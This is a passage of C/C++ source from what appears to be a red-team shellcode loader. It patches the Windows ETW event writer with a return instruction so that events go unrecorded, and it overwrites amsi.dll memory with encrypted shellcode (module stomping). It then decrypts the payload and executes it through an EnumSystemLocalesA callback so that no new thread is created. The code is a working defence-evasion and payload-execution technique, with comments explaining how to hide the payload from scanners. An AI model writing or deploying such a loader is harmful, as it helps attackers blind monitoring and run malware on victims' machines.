		https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/etw-event-tracing-for-windows-101 
	*/

	PRINT_SUCCESST("Patching ETW 'Event Tracing for Windows' writer");
	deObfuscate(cEtwEventWrite, SIZEOF(cEtwEventWrite));

	void* etwAddr = myGetProcAddr(myGetModuleHandle(wNtdll), cEtwEventWrite);
	char etwPatch[] = { 0xC3 };
	DWORD lpflOldProtect = 0;
	unsigned __int64 memPage = 0x1000;
	void* etwAddr_bk = etwAddr;
	NtProtectVirtualMemory(pGetCurrentProcessFunc(), (PVOID*)&etwAddr_bk, (PSIZE_T)&memPage, 0x04, &lpflOldProtect);
	NtWriteVirtualMemory(pGetCurrentProcessFunc(), (LPVOID)etwAddr, (PVOID)etwPatch, sizeof(etwPatch), (PULONG)nullptr);
	NtProtectVirtualMemory(pGetCurrentProcessFunc(), (PVOID*)&etwAddr_bk, (PSIZE_T)&memPage, lpflOldProtect, &lpflOldProtect);

	PRINT_STATUS("ETW patched !");
	PRINT_STATUS("amsi.dll .text address = 0x%p", pHollowedDLL);

	/* the .text section doesn't have Write permission, so we changes protection to RW and later before exection we will restore again to RX */
	PRINT_SUCCESST("converting protection to RW in ntdll");
	if (!VirtualProtect(pHollowedDLL, 4096, PAGE_READWRITE, &dwOldProtection)) {
		PRINT_ERROR("Failed to converting protection to RW (%u)\n", GetLastError());
		return -2;
	}

	/*
		If you want to use RtlMoveMemory API you can use this and comment the manual technique :
		RtlMoveMemory(pHollowedDLL, shellcode, sizeof(shellcode)); 
	*/

	PRINT_SUCCESST("moving the payload to the hollowed memory without using an APIs");

	for (int i = 0; i < sizeof(shellcode); i++) {
		pHollowedDLL[i] = shellcode[i];
	}

	/*
		in this phase we can decrypt the paylaod (after stomping)
		we can't decrypt before this phase, we must hide payload first
	*/

	deObfuscate(decKey, SIZEOF(decKey));
    reverseShellcode(pHollowedDLL, sizeof(shellcode));	
	decShell(pHollowedDLL);

	PRINT_SUCCESST("Shellcode & key Decrypted after stomping, Shellcode length: %d", sizeof(shellcode));
	PRINT_STATUS("Restoring RX permission again");
	
	if (!VirtualProtect(pHollowedDLL, 4096, dwOldProtection, &dwOldProtection)) {
		PRINT_ERROR("Failed to converting protection to RW (%u)\n", GetLastError());
		return -2;
	}
	
	PRINT_SUCCESST("Hit enter to run shellcode/payload without creating a new thread");	getchar();
	
	BOOL success = EnumSystemLocalesA((LOCALE_ENUMPROCA)pHollowedDLL, LCID_SUPPORTED);
	if (success) { return TRUE; } else { return FALSE; }

	/*
		You can also use this technique for executing shellcode without create a new thread :
		if (pHollowedDLL) { void (*funcPtr)(void) = (void (*)()) pHollowedDLL; funcPtr(); }
	*/

	return 0;
}
